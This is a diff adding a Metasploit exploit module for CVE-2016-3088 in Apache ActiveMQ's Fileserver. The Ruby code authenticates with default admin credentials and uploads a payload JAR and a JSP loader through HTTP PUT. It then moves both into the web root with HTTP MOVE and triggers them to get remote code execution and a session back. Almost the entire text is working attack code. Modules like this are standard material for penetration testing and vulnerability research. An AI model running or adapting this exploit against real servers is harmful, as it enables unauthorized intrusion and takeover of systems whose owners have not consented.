@@ -1,0 +1,140 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'ActiveMQ web shell upload',
+      'Description' => %q(
+        The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0
+        allows remote attackers to upload and execute arbitrary files via an
+        HTTP PUT followed by an HTTP MOVE request.
+      ),
+      'Author'      => [ 'Ian Anderson <andrsn84[at]gmail.com>', 'Hillary Benson <1n7r1gu3[at]gmail.com>' ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          [ 'CVE', '2016-3088' ],
+          [ 'URL', 'http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt' ]
+        ],
+      'Privileged'  => true,
+      'Platform'    => %w{ java linux win },
+      'Targets'     =>
+        [
+          [ 'Java Universal',
+            {
+              'Platform' => 'java',
+              'Arch' => ARCH_JAVA
+            }
+          ],
+          [ 'Linux',
+            {
+              'Platform' => 'linux',
+              'Arch' => ARCH_X86
+            }
+          ],
+          [ 'Windows',
+             {
+               'Platform' => 'win',
+               'Arch' => ARCH_X86
+             }
+           ]
+        ],
+      'DisclosureDate' => "Jun 01 2016",
+      'DefaultTarget'  => 0))
+    register_options(
+      [
+        OptString.new('BasicAuthUser', [ true, 'The username to authenticate as', 'admin' ]),
+        OptString.new('BasicAuthPass', [ true, 'The password for the specified username', 'admin' ]),
+        OptString.new('JSP', [ false, 'JSP name to use, excluding the .jsp extension (default: random)', nil ]),
+        OptString.new('AutoCleanup', [ false, 'Remove web shells after callback is received', 'true' ]),
+        Opt::RPORT(8161)
+      ])
+    register_advanced_options(
+      [
+        OptString.new('UploadPath', [false, 'Custom directory into which web shells are uploaded', nil])
+      ])
+  end
+
+  def jsp_text(payload_name)
+    %{
+    <%@ page import="java.io.*"
+    %><%@ page import="java.net.*"
+    %><%
+    URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(request.getRealPath("./#{payload_name}.jar")).toURI().toURL()});
+    Class c = cl.loadClass("metasploit.Payload");
+    c.getMethod("main",Class.forName("[Ljava.lang.String;")).invoke(null,new java.lang.Object[]{new java.lang.String[0]});
+    %>}
+  end
+
+  def exploit
+    jar_payload = payload.encoded_jar.pack
+    payload_name = datastore['JSP'] || rand_text_alpha(8 + rand(8))
+    host = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+    @url = datastore['SSL'] ? "https://#{host}" : "http://#{host}"
+    paths = get_upload_paths
+    paths.each do |path|
+      if try_upload(path, jar_payload, payload_name)
+        break handler if trigger_payload(payload_name)
+        print_error('Unable to trigger payload')
+      end
+    end
+  end
+
+  def try_upload(path, jar_payload, payload_name)
+    ['.jar', '.jsp'].each do |ext|
+      file_name = payload_name + ext
+      data = ext == '.jsp' ? jsp_text(payload_name) : jar_payload
+      move_headers = { 'Destination' => "#{@url}#{path}#{file_name}" }
+      upload_uri = normalize_uri('fileserver', file_name)
+      print_status("Uploading #{move_headers['Destination']}")
+      register_files_for_cleanup "#{path}#{file_name}" if datastore['AutoCleanup'].casecmp('true')
+      return error_out unless send_request('PUT', upload_uri, 204, 'data' => data) &&
+                              send_request('MOVE', upload_uri, 204, 'headers' => move_headers)
+      @trigger_resource = /webapps(.*)/.match(path)[1]
+    end
+    true
+  end
+
+  def get_upload_paths
+    base_path = "#{get_install_path}/webapps"
+    custom_path = datastore['UploadPath']
+    return [normalize_uri(base_path, custom_path)] unless custom_path.nil?
+    [ "#{base_path}/api/", "#{base_path}/admin/" ]
+  end
+
+  def get_install_path
+    properties_page = send_request('GET', "#{@url}/admin/test/systemProperties.jsp").body
+    match = properties_page.tr("\n", '@').match(/activemq\.home<\/td>@\s*<td>([^@]+)<\/td>/)
+    return match[1] unless match.nil?
+  end
+
+  def send_request(method, uri, expected_response = 200, opts = {})
+    opts['headers'] ||= {}
+    opts['headers']['Authorization'] = basic_auth(datastore['BasicAuthUser'], datastore['BasicAuthPass'])
+    opts['headers']['Connection'] = 'close'
+    r = send_request_cgi(
+      {
+        'method'  => method,
+        'uri'     => uri
+      }.merge(opts)
+    )
+    return false if r.nil? || expected_response != r.code.to_i
+    r
+  end
+
+  def trigger_payload(payload_name)
+    send_request('POST', @url + @trigger_resource + payload_name + '.jsp')
+  end
+
+  def error_out
+    print_error('Upload failed')
+    @trigger_resource = nil
+    false
+  end
+end
